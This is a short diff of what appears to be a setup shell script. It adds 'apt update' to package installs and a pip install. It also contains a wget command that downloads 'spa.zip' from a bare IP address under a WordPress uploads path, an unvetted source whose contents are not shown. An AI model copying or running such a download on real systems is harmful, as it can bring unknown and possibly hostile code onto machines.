@@ -1,3 +1,4 @@
+apt update
 apt install tmux python3-pip zip -y
 pip install requests
 wget http://20.187.190.201:8080/wp-content/uploads/2022/12/spa.zip
